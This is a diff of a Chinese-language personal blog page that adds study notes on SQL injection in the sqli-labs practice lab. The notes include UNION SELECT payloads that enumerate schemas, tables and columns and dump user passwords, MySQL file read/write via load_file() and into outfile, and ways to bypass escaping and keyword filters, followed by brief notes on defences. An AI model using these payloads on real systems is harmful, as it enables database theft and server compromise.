@@ -451,21 +451,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-13
+                    2022-03-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    180
+                    514
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -492,7 +492,42 @@
 <p>（2）mysql数据库的访问：<code>mysql -uroot -p</code></p>
 <p>（3）<code>information_schema.schemata</code>存储各个数据库的名字<code>schema_name</code></p>
 <h3 id="2、sqli-lab实例"><a href="#2、sqli-lab实例" class="headerlink" title="2、sqli-lab实例"></a>2、sqli-lab实例</h3><p>（1）获取此网页所有数据库的名字</p>
-<p><code>?id=-1 union  select 1,group_concat(schema_name),3  from information_schema.schemata</code></p>
+<p><code>union select 1,group_concat(schema_name),3  from information_schema.schemata</code></p>
+<p><img src="C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20220313194506151.png" alt="数据库名字"></p>
+<p>（2）获取指定security数据库名下的表名信息</p>
+<p><code> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203131951836.png" alt="security数据库下的表名信息"></p>
+<p>（3）获取指定security数据库下的表名users下的列名信息</p>
+<p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203131958871.png" alt="列名信息"></p>
+<p>（4）获取列名下面的数据</p>
+<p><code>union select 1,password,3 from security.users</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203132002889.png" alt="列名下面的数据"></p>
+<h3 id="3、文件读写"><a href="#3、文件读写" class="headerlink" title="3、文件读写"></a>3、文件读写</h3><p>（1）常用函数</p>
+<p><code>load_file()</code>读取函数</p>
+<p><code>into outfile</code>或<code>into dumpfile</code>写入函数 </p>
+<p>（2）实例</p>
+<p><code>select load_file(&#39;c:/xxxxx&#39;)</code>   <code>\</code>一般会认为转义字符</p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203132010250.png" alt="文件读取"></p>
+<p><code>select &#39;x&#39; into outfile  &#39;1.txt&#39;</code></p>
+<p>若文件已存在不能用此函数进行文件写入</p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203132012806.png" alt="文件写入"></p>
+<p>（3）获取路径常见方法</p>
+<p>常见<code>load_file()</code>读取敏感信息</p>
+<p>报错显示</p>
+<p>遗留文件：<code>phpinfo.php SCRIRT_FILENAME</code></p>
+<p>漏洞报错</p>
+<p>平台配置文件（根据环境决定）</p>
+<p>爆破：<code>windows: d:/wwwroot/域名/   Linux: /var/www/域名</code></p>
+<p>（4）魔术引号</p>
+<p><code>magic_quotes_gpc</code>对双引号，反斜杠，NULL，单引号会被转义（加上反斜杠）。</p>
+<p>绕过：编码（十六进制）或宽字节绕过</p>
+<p><code>addslashes()</code>PHP内置转义函数：对双引号，反斜杠，NULL，单引号转义</p>
+<h3 id="3、注入防护"><a href="#3、注入防护" class="headerlink" title="3、注入防护"></a>3、注入防护</h3><p>（1）自带防御：魔术引号</p>
+<p>（2）内置函数：<code>int</code>或<code>addslashes()</code>等</p>
+<p><code>if (is_int($id))</code>数字无法注入</p>
+<p>（3）自定义关键字：<code>select</code>对关键字进行过滤（有时可以试试大小写）</p>
+<p>（4）waf防护软件：安全狗，宝塔等</p>
 
                 
             </div>
@@ -896,7 +931,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">15.2k</span>
+                        class="white-color">15.5k</span>
             
             
             
